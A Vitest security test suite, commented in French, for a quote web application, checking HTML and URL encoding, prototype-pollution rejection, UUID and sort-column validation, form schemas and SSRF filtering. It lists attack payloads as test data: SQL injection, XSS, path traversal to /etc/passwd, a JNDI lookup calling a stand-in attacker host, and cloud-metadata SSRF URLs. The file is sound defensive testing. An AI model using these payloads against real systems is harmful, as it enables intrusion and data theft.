import { describe, expect, test } from "vitest";
import { escapeAttr, escapeHtml, escapeJsonForScript, escapeUrl } from "@/lib/security/encoding";
import { containsUnsafeKeys } from "@/lib/security/body";
import { parseUuidParam, PaginationSchema, SearchTermSchema } from "@/lib/validations/identifiers";
import { QuoteRequestSchema } from "@/lib/validations/quote-schemas";
import { INTERVENTION_OPTIONS, QUOTE_DEFAULTS, ROOF_TYPE_OPTIONS } from "@/domain/quote-options";
import { allowedSortColumns, resolveOrderBy } from "@/lib/db/sort";
import { assertSafeOutboundUrl, isPrivateAddress } from "@/lib/security/ssrf";

/**
 * Charges d'attaque classiques, envoyees sur chaque point d'entree qui accepte
 * une valeur exterieure. On verifie un rejet *propre* : pas d'exception non
 * geree, pas de message revelant la structure interne.
 */
const ESC = String.fromCharCode(27);
const NUL = String.fromCharCode(0);

const PAYLOADS = [
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "../../etc/passwd",
  "....//....//etc/passwd",
  "${jndi:ldap://attaquant.example/a}",
  "{{7*7}}",
  "javascript:alert(1)",
  NUL + "nul",
];

describe("Encodage contextuel", () => {
  test("le HTML neutralise les charges d'injection de balise", () => {
    for (const payload of PAYLOADS) {
      const encoded = escapeHtml(payload);
      expect(encoded).not.toContain("<script");
      expect(encoded).not.toContain("<img");
      // Aucun chevron brut ne subsiste.
      expect(encoded.includes("<")).toBe(false);
      expect(encoded.includes(">")).toBe(false);
    }
  });

  test("l'encodage d'attribut neutralise la sortie d'attribut non quote", () => {
    const encoded = escapeAttr('x onerror=alert(1) "');
    expect(encoded).not.toContain('"');
    expect(encoded).toContain("&#x3D;");
  });

  test("les schemas d'URL actifs sont refuses", () => {
    expect(escapeUrl("javascript:alert(1)")).toBe("#");
    expect(escapeUrl("JavaScript:alert(1)")).toBe("#");
    expect(escapeUrl("data:text/html;base64,PHNjcmlwdD4=")).toBe("#");
    expect(escapeUrl("https://zlobodan-couverture.be/devis")).toContain("https://");
  });

  test("le JSON embarque ne peut pas fermer la balise script", () => {
    const encoded = escapeJsonForScript({ nom: "</script><script>alert(1)</script>" });
    expect(encoded).not.toContain("</script>");
    expect(encoded).toContain("\\u003c");
  });
});

describe("Corps de requete", () => {
  test("les cles de pollution de prototype sont refusees a toute profondeur", () => {
    // Construit via JSON.parse et non par litteral : un litteral `__proto__`
    // *definit le prototype* au lieu de creer une propriete propre, ce qui
    // n est justement pas le vecteur reel. JSON.parse, lui, cree bien la cle.
    expect(containsUnsafeKeys(JSON.parse(String.raw`{"__proto__": {"admin": true}}`))).toBe(true);
    expect(containsUnsafeKeys({ a: { b: { constructor: 1 } } })).toBe(true);
    expect(containsUnsafeKeys([{ prototype: 1 }])).toBe(true);
    expect(containsUnsafeKeys({ email: "a@b.be", nom: "Dupont" })).toBe(false);
  });

  test("les operateurs de requete sont refuses", () => {
    expect(containsUnsafeKeys({ email: { $ne: null } })).toBe(true);
    expect(containsUnsafeKeys({ $where: "1==1" })).toBe(true);
  });

  test("une structure anormalement profonde est traitee comme hostile", () => {
    let deep: Record<string, unknown> = { v: 1 };
    for (let i = 0; i < 12; i += 1) deep = { nested: deep };
    expect(containsUnsafeKeys(deep)).toBe(true);
  });
});

describe("Validation des identifiants", () => {
  test("tout identifiant non-UUID est rejete sans requete", () => {
    for (const payload of PAYLOADS) {
      expect(parseUuidParam(payload).ok).toBe(false);
    }
    expect(parseUuidParam("DEV-2026-0012").ok).toBe(false);
    expect(parseUuidParam(undefined).ok).toBe(false);
  });

  test("un UUID valide est accepte", () => {
    const result = parseUuidParam("3f2504e0-4f89-41d3-9a0c-0305e82c3301");
    expect(result.ok).toBe(true);
    expect(result.value).toBe("3f2504e0-4f89-41d3-9a0c-0305e82c3301");
  });

  test("la pagination est plafonnee quelle que soit la valeur recue", () => {
    // Ramene au plafond, pas rejete : un client ne doit pas pouvoir provoquer
    // une erreur avec une valeur excessive.
    expect(PaginationSchema.parse({ limit: "100000" }).limit).toBe(100);
    expect(PaginationSchema.parse({ limit: "50" }).limit).toBe(50);
    expect(PaginationSchema.parse({}).limit).toBe(20);
    expect(PaginationSchema.parse({ limit: "-1" }).limit).toBe(1);
    expect(PaginationSchema.parse({ limit: "nimportequoi" }).limit).toBe(20);
  });

  test("la recherche retire les caracteres de controle", () => {
    const parsed = SearchTermSchema.parse(`toiture ${ESC}[31m ardoise`);
    expect(parsed).toBe("toiture [31m ardoise");
    expect(SearchTermSchema.safeParse("x".repeat(200)).success).toBe(false);
  });
});

describe("Tri dynamique", () => {
  test("une colonne non listee retombe sur le tri par defaut sans lever", () => {
    for (const payload of PAYLOADS) {
      expect(() => resolveOrderBy("invoices", payload, "asc")).not.toThrow();
    }
    // Tentative d'injection par le sens de tri.
    expect(() => resolveOrderBy("invoices", "number", "asc; DROP TABLE users")).not.toThrow();
  });

  test("les colonnes exposees sont bien une liste fermee", () => {
    const columns = allowedSortColumns("invoices");
    expect(columns).toContain("number");
    expect(columns).not.toContain("password_hash");
    expect(columns).not.toContain("passwordHash");
  });

  test("une cle heritee du prototype n'est pas acceptee comme colonne", () => {
    expect(() => resolveOrderBy("invoices", "constructor", "asc")).not.toThrow();
    expect(() => resolveOrderBy("invoices", "__proto__", "asc")).not.toThrow();
  });
});

describe("Formulaire public de devis", () => {
  const valid = {
    // Valeurs tirees du domaine : la fixture ne peut plus encoder un
    // vocabulaire different de celui reellement propose a l utilisateur.
    interventionType: QUOTE_DEFAULTS.interventionType,
    roofType: QUOTE_DEFAULTS.roofType,
    surface: QUOTE_DEFAULTS.surface,
    postalCode: "1050",
    city: "Ixelles",
    fullName: "Jean Peeters",
    phone: "02 345 67 89",
    email: "jean@example.be",
    rgpdConsent: "true",
  };

  test("une demande conforme est acceptee", () => {
    expect(QuoteRequestSchema.safeParse(valid).success).toBe(true);
  });

  test("les charges d'injection sont rejetees sur les champs a liste fermee", () => {
    for (const payload of PAYLOADS) {
      expect(QuoteRequestSchema.safeParse({ ...valid, interventionType: payload }).success).toBe(false);
      expect(QuoteRequestSchema.safeParse({ ...valid, postalCode: payload }).success).toBe(false);
      expect(QuoteRequestSchema.safeParse({ ...valid, phone: payload }).success).toBe(false);
      expect(QuoteRequestSchema.safeParse({ ...valid, email: payload }).success).toBe(false);
    }
  });

  /**
   * Garde de contrat client/serveur.
   *
   * La liste des interventions etait ecrite deux fois, avec un vocabulaire
   * different de part et d'autre : quatre des sept options proposees a
   * l'utilisateur etaient rejetees en 400. Ce test echoue desormais si une
   * option affichable cesse d'etre acceptee par la validation.
   */
  test("chaque option affichee est acceptee par la validation serveur", () => {
    for (const option of INTERVENTION_OPTIONS) {
      const parsed = QuoteRequestSchema.safeParse({ ...valid, interventionType: option.id });
      expect(parsed.success, `intervention refusee : ${option.id}`).toBe(true);
    }
    for (const option of ROOF_TYPE_OPTIONS) {
      const parsed = QuoteRequestSchema.safeParse({ ...valid, roofType: option.id });
      expect(parsed.success, `couverture refusee : ${option.id}`).toBe(true);
    }
  });

  test("le consentement RGPD est obligatoire", () => {
    expect(QuoteRequestSchema.safeParse({ ...valid, rgpdConsent: "false" }).success).toBe(false);
  });

  test("la description est bornee en longueur", () => {
    const result = QuoteRequestSchema.safeParse({ ...valid, description: "a".repeat(5000) });
    expect(result.success).toBe(false);
  });

  test("le texte libre conserve sa valeur mais perd ses caracteres de controle", () => {
    const result = QuoteRequestSchema.parse({ ...valid, description: `Fuite${NUL} au faitage` });
    expect(result.description).toBe("Fuite au faitage");
  });
});

describe("SSRF", () => {
  test("les adresses privees et de metadonnees cloud sont reconnues", () => {
    const privates = [
      "127.0.0.1",
      "localhost",
      "10.0.0.5",
      "192.168.1.1",
      "172.16.0.1",
      "169.254.169.254",
      "metadata.google.internal",
      "::1",
    ];
    for (const host of privates) expect(isPrivateAddress(host)).toBe(true);
    expect(isPrivateAddress("api.pwnedpasswords.com")).toBe(false);
  });

  test("seuls les domaines de la liste blanche sont autorises", () => {
    expect(assertSafeOutboundUrl("https://api.pwnedpasswords.com/range/ABCDE").allowed).toBe(true);
    expect(assertSafeOutboundUrl("https://attaquant.example/x").allowed).toBe(false);
    expect(assertSafeOutboundUrl("http://api.pwnedpasswords.com/x").allowed).toBe(false);
    expect(assertSafeOutboundUrl("https://169.254.169.254/latest/meta-data/").allowed).toBe(false);
  });

  test("les identifiants dans l'URL ne permettent pas de contourner le filtre d'hote", () => {
    const verdict = assertSafeOutboundUrl(
      "https://api.pwnedpasswords.com@attaquant.example/vol"
    );
    expect(verdict.allowed).toBe(false);
  });
});
